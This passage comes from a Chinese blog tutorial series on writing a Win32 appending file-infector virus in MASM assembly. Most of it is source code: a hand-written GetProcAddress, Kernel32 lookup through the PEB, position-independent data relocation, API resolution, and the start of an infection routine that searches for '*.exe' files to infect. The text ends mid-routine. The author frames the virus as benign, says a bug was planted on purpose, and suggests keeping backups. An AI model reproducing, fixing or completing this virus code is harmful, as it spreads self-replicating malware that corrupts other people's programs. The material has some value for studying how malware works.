
#### Not_Match:

```asm
    pop eax
    inc eax
    add edi, 4h
  loop LoopNumberOfName

GetKernel_API_Index_Found:
  pop eax
```

; 用函数 ID 找出函数入口地址

#### Get_API_Address:

```asm
  mov ebx, AddressOfOrdinarls
  movzx eax, word ptr [ebx+eax*2]
  imul eax, 4h
  add  eax, AddressOfFunctions
  mov  eax, [eax]
  add  eax, Base
  ret

My_Get_API_Address endp
```

OK，既然已经有了自己编写的 `GetProcAddress`，那么我们就可以通过它定位 `Kernel32.DLL` 里的正牌 `GetProcAddress` 和 `LoadLibraryA`。

不过小陈告诉另一个方法，`GetProcAddress` 和 `LoadLibraryA` 都可以不必定位，其中 `GetProcAddress` 可以使用自己编写了，自然可以不必定位。至于 `LoadLibrary` 返回的动态链接库 DLL 模块句柄，实际上就是动态链接库的基地址，虽然由于我们现在只有 `Kernel32.dll` 的基地址，如果想定位其他动态链接库，只有搜索宿主文件是否加载了相应的动态链接库，如果没有，也可修改它的 PE 文件头，让它在启动时加载该动态链接库，然后仿照搜索 `Kernel32.dll` 类似的方法，确定其入口地址，即模块句柄。

终于完成这章了，好幸福！关于动态重定位 API 方法肯定不止这些方法，比如“三、通过 API 的名称来定位 API 的地址”这个标题下应该不止一种方法，学海无涯啊。再次欢迎有好方法的高手，不吝赐教，帮助我不断更新这篇文章。

这里感谢 pencil 和小陈，pencil 提醒了我应该仿写 `GetProcAddress`，小陈告诉了我，替代 `LoadLibraryA` 的实现方法。

本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/08/5928365.aspx

OK，兑现我的承诺，从本章开始讲述“追加病毒”的编写方法。我们将实现一个只弹出对话框的良性病毒，但是考虑到这个代码可能造成的危害，我会在感染模块中写入一个小 Bug。不过，对于大家的学习是毫无影响的。

回到正题，先介绍一下“追加病毒”，在 DOS 时代中，这种病毒相当常见。由于 `.com` 文件的入口点是固定的，而且我们知道 DOS 平台程序可以随意使用中断，因此追加病毒只要将病毒代码追加到宿主文件尾，然后修改入口点代码成“`jmp [病毒入口点]`”，病毒执行完成后，再 `jmp` 到宿主程序。

到了 `win32` 平台下，这种方法是不行滴。首先由于 `win32` 下，应用程序不能使用中断，取而代之的是 API，但是常用宿主文件的 PE 文件格式只会为宿主文件本身配置 API，病毒代码是不能直接得到的。其次将病毒代码追加到文件尾，如果不修改宿主文件的 PE 头，病毒可能不被加载到内存中。还有 DOS 追加病毒就存在的数据重定位问题，那么看看下面我们如何解决这些问题呢？

### 一. 先看一下主模块 `Main.asm`

```asm
.386

.model flat, stdcall

option casemap:none

include windows.inc ; 虽然不会调用这里的函数，但是其中的常量还是用的，比如 INVILID

include My_Marco.asm ; 自定义的一些宏,里边内容用的时候我再说

.code

Start:
  main proc
  ; 主模块分成五个子模块
  Include Data_and_Locate.asm
  Include ReLocate_API.asm
  Include Infect.asm
  Include Destory.asm
  Include Cleanup_and_jmp.asm
  ret

main endp

include My_Function.asm ; 这个里边放着一些调用函数，比如是上一篇中的 My_Get_API_Address

VirusSize = $-Start ; 病毒长度

end Start
```

### 二. 局部变量和只读数据以及只读数据重定位模块 `Data_and_Locate.asm`

```asm
; 首先声明 main proc 的局部变量

LOCAL Kernel32Base:dword
LOCAL Kernel32NumberOfName:dword
LOCAL Kernel32AddressOfFunctions:dword
LOCAL Kernel32AddressOfNames:dword
LOCAL Kernel32AddressOfOrdinarls:dword
LOCAL DataBase:dword
LOCAL HostFileSize:dword
LOCAL hKernel32DLL:HANDLE
LOCAL hUser32DLL:HANDLE
LOCAL hFindFirstFile:HANDLE
LOCAL szLocalFilePath[MAX_PATH]:byte
LOCAL stHostFile:PE_FileInformation
LOCAL stLocalFile:PE_FileInformation
LOCAL aLoadLibraryA:dword
LOCAL aGetProcAddress:dword
LOCAL aCreateFileA:dword
LOCAL aCreateFileMappingA:dword
LOCAL aMapViewOfFile:dword
LOCAL aFindFirstFileA:dword
LOCAL aFindNextFileA:dword
LOCAL aGetModuleFileNameA:dword
LOCAL aGetFileSize:dword
LOCAL aUnmapViewOfFile:dword
LOCAL aCloseHandle:dword
LOCAL aMessageBoxA:dword
LOCAL Temp:dword
LOCAL fd:WIN32_FIND_DATA
LOCAL NewSectionTable:dword
LOCAL Virus_OEP_File:dword
LOCAL Virus_OEP_Map:dword

; 重定位数据，使得数据内嵌在代码节中,同时定位标记“Data：”的地址
call Relocation

Data:
    sLoadLibraryA = $-Data ; 该只读数据与 Data 的偏移
     byte  'LoadLibraryA',0 ; 数据内容，可以看出这是一个 C 风格的字符串
    sGetProcAddress  = $-Data
       byte   'GetProcAddress',0
    sKernel32DLL  = $-Data
       byte  'Kernel32.dll',0
    sUser32DLL    = $-Data
       byte  'User32.dll',0
    sCreateFileA  = $-Data
       byte  'CreateFileA',0
    sCreateFileMappingA = $-Data
        byte  'CreateFileMappingA',0
    sMapViewOfFile  = $-Data
       byte  'MapViewOfFile',0
    sFindFirstFileA  = $-Data
       byte  'FindFirstFileA',0
    sFindFirstFileA_Param = $-Data
        byte  '*.exe',0
    sFindNextFileA  = $-Data
       byte  'FindNextFileA',0
    sGetModuleFileNameA = $-Data
       byte  'GetModuleFileNameA',0
    sUnmapViewOfFile  = $-Data
       byte  'UnmapViewOfFile',0
    sGetFileSize  = $-Data
        byte  'GetFileSize',0
    sCloseHandle  = $-Data
       byte  'CloseHandle',0
    sCaption    = $-Data
       byte  'The virus for testing',0
    sContext    = $-Data
       byte   'This is a additional virus',0
    sMessageBoxA  = $-Data
        byte  'MessageBoxA',0
    sNewSectionName  = $-Data
       byte  '.Virus',0,0

    aOEP_HostFile  = $-Data
        dword  0h

Relocation:
  pop DataBase ; 不但 pop 的值恰好是 Data：的地址，call 又巧妙地跳过数据块
```

### 三. API 重定位模块 `ReLocate_API.asm`

```asm
; 取得 Kernel32.dll 的基址
  assume fs:nothing
  mov eax, [fs:30h]
  mov eax, [eax+0ch]
  mov eax, [eax+1ch]
  mov eax, [eax]
  mov eax, [eax+8h]
  mov  Kernel32Base, eax

; 利用 LoadLibrary 和 GetProcAddress 取得所需函数的地址
; 这里使用了 My_Marco.asm 的宏
; PushData macro Base, OffsetAddress
;   mov eax, Base
;   add eax, OffsetAddress
;   push eax
; ENDM

  PushData DataBase, sLoadLibraryA
  push Kernel32Base
  call My_Get_API_Address
  mov  aLoadLibraryA, eax ; 得到函数 LoadLibraryA 的地址

  PushData DataBase, sGetProcAddress
  push Kernel32Base
  call My_Get_API_Address
  mov  aGetProcAddress, eax ; 得到函数 GetProcAddress 的地址

; 利用 LoadLibrary 和 GetProcAddress 取得所需函数的地址
; 这里使用了 My_Marco.asm 的宏
; Using_API_LoadLibraryA macro Value, Base, OffsetAddress
;   PushData Base, OffsetAddress
;   call aLoadLibraryA
;   mov Value, eax
; ENDM
; Using_API_GetProcAddress macro Value, Base, OffsetAddress, hDLL
;   PushData Base, OffsetAddress
;   Push hDLL
;   call aGetProcAddress
;   mov Value, eax
; ENDM

  Using_API_LoadLibraryA hKernel32DLL, DataBase, sKernel32DLL
  Using_API_LoadLibraryA hUser32DLL, DataBase, sUser32DLL
  Using_API_GetProcAddress aCreateFileA, DataBase, sCreateFileA, hKernel32DLL
  Using_API_GetProcAddress aCreateFileMappingA, DataBase, sCreateFileMappingA, hKernel32DLL
  Using_API_GetProcAddress aMapViewOfFile, DataBase, sMapViewOfFile, hKernel32DLL
  Using_API_GetProcAddress aFindFirstFileA, DataBase, sFindFirstFileA, hKernel32DLL
  Using_API_GetProcAddress aFindNextFileA, DataBase, sFindNextFileA, hKernel32DLL
  Using_API_GetProcAddress aGetModuleFileNameA, DataBase, sGetModuleFileNameA, hKernel32DLL
  Using_API_GetProcAddress aUnmapViewOfFile, DataBase, sUnmapViewOfFile, hKernel32DLL
  Using_API_GetProcAddress aCloseHandle, DataBase, sCloseHandle, hKernel32DLL
  Using_API_GetProcAddress aMessageBoxA, DataBase, sMessageBoxA, hUser32DLL
  Using_API_GetProcAddress aGetFileSize, DataBase, sGetFileSize, hKernel32DLL
```

本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/27/5968811.aspx

原本这一篇应该和上一篇同时发，但是我的原来代码写得很烂，而且由于我的目标是编写一个“追加病毒”框架，代码又要具备良好的模块特征。这两天改来改去，已经头脑混乱了，所以还是先发文章把原来的代码挂上，有时间再改，我会配上说明。

另外提一句，我把一个 bug 写在 `AddSection` 这个函数里，很多教学码也故意写这个错误，这个错误本意是修改由于 PE 文件头的修改使“xx 值”应适当变化，实际写入的是空位置，这个值不应该变化，这个画蛇添足的行为会导致被感染文件出现一个对齐问题的错误，使系统认为它不是一个有效文件。自己独立写出一个 `AddSection` 函数（汇编里不叫函数，应该叫过程），是很有好处的。

如果你水平足够修改这个 bug，并不是所有被感染 `.exe` 文件都能正常运行，由于这只是一个练习病毒，缺少很多东西，我测试时用的是《格式工厂》,建议使用这个。测试时留个备份，这个测试病毒只会感染自己所在文件夹里 `.exe` 文件。

```asm
;///////////////////Infect.asm

; 打开病毒程序本身
  push MAX_PATH
  lea  eax, szLocalFilePath
  push eax
  push dword ptr 0h
  call aGetModuleFileNameA
  push dword ptr 0h
  push dword ptr 0h
  push OPEN_EXISTING
  push dword ptr 0h
  push FILE_SHARE_READ
  push GENERIC_READ
  lea  eax, szLocalFilePath
  push eax
  call aCreateFileA
  mov  stLocalFile.hFile, eax
  push dword ptr 0h
  push dword ptr 0h
  push dword ptr 0h
  push PAGE_READONLY
  push NULL
  push stLocalFile.hFile
  call aCreateFileMappingA
  mov stLocalFile.hMap, eax
  push dword ptr 0h
  push dword ptr 0h
  push dword ptr 0h
  push FILE_MAP_READ
  push stLocalFile.hMap
  call aMapViewOfFile
  mov stLocalFile.ImageBase, eax

; 搜索并打开宿主文件
  lea eax, fd
  push eax
  PushData DataBase, sFindFirstFileA_Param
```
